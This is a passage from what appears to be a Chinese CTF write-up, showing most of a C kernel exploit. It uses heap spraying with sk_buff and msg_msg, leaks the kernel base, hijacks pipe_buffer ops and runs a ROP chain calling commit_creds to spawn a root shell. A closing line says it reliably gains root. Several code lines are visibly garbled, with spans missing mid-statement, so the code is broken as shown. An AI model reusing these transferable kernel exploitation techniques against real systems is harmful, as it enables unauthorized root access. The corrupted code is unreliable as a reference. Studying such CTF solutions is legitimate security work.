    }
    void getRootShell(void)
    {
        if (getuid())
            errExit("failed to gain the root!");
        printf("\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n");
        system("/bin/sh");
    }
    int main(int argc, char **argv, char **envp)
    {
        int         oob_pipe_fd[2];
        int         sk_sockets[SOCKET_NUM][2];
        int         pipe_fd[PIPE_NUM][2];
        int         msqid[MSG_QUEUE_NUM];
        int         victim_qid, real_qid;
        struct msg_msg  *nearby_msg;
        struct msg_msg  *nearby_msg_prim;
        struct pipe_buffer *pipe_buf_ptr;
        struct pipe_buf_operations *ops_ptr;
        uint64_t    victim_addr;
        uint64_t    kernel_base;
        uint64_t    kernel_offset;
        uint64_t    *rop_chain;
        int         rop_idx;
        cpu_set_t   cpu_set;
        saveStatus();
        /*
         * Step.O
         * Initialization
         */
        // run the exp on specific core only
        CPU_ZERO(&cpu_set);
        CPU_SET(0, &cpu_set);
        sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
        // socket pairs to spray sk_buff
        for (int i = 0; i m_list.prev);
        // release and re-spray sk_buff to construct fake msg_msg
        // so that we can make an arbitrary read on a primary msg_msg
        if (freeSkBuff(sk_sockets, fake_secondary_msg, 
                sizeof(fake_secondary_msg)) m_list.prev - 8, 0);
        if (spraySkBuff(sk_sockets, fake_secondary_msg, 
                sizeof(fake_secondary_msg)) m_list.next - 0x400;
        printf("\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n", 
                nearby_msg_prim->m_list.next);
        printf("\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n", victim_addr);
        /*
         * Step.IV
         * fix the header of UAF obj and release it
         * spray pipe_buffer and leak the kernel base
         */
        puts("\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m");
        // re-construct the msg_msg to fix it
        puts("[*] fixing the UAF obj as a msg_msg...");
        if (freeSkBuff(sk_sockets, fake_secondary_msg, 
                sizeof(fake_secondary_msg)) ops > 0xffffffff81000000)
                {
                    printf("\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n", 
                            pipe_buf_ptr->ops);
                    kernel_offset = pipe_buf_ptr->ops - ANON_PIPE_BUF_OPS;
                    kernel_base = 0xffffffff81000000 + kernel_offset;
                }
            }
        }
        printf("\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n", 
                kernel_base, kernel_offset);
        /*
         * Step.V
         * hijack the ops of pipe_buffer
         * free all pipe to trigger fake ptr
         * so that we hijack the RIP
         * construct a ROP on pipe_buffer
         */
        puts("\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m");
        puts("[*] pre-construct data in userspace...");
        pipe_buf_ptr = (struct pipe_buffer *) fake_secondary_msg;
        pipe_buf_ptr->page = *(uint64_t*) "arttnba3";
        pipe_buf_ptr->ops = victim_addr + 0x100;
        ops_ptr = (struct pipe_buf_operations *) &fake_secondary_msg[0x100];
        ops_ptr->release = PUSH_RSI_POP_RSP_POP_4VAL_RET + kernel_offset;
        rop_idx = 0;
        rop_chain = (uint64_t*) &fake_secondary_msg[0x20];
        rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;
        rop_chain[rop_idx++] = kernel_offset + INIT_CRED;
        rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;
        rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 22;
        rop_chain[rop_idx++] = *(uint64_t*) "arttnba3";
        rop_chain[rop_idx++] = *(uint64_t*) "arttnba3";
        rop_chain[rop_idx++] = getRootShell;
        rop_chain[rop_idx++] = user_cs;
        rop_chain[rop_idx++] = user_rflags;
        rop_chain[rop_idx++] = user_sp;
        rop_chain[rop_idx++] = user_ss;
        puts("[*] spray sk_buff to hijack pipe_buffer...");
        if (spraySkBuff(sk_sockets, fake_secondary_msg, 
                sizeof(fake_secondary_msg)) release to hijack RIP...");
        for (int i = 0; i < PIPE_NUM; i++)
        {
            close(pipe_fd[i][0]);
            close(pipe_fd[i][1]);
        }
    }
运行即可完成提权，相较于官方最初给出的解法而言成功率会高很多，据悉解出来的队伍中大部分也是利用这种解法完成解题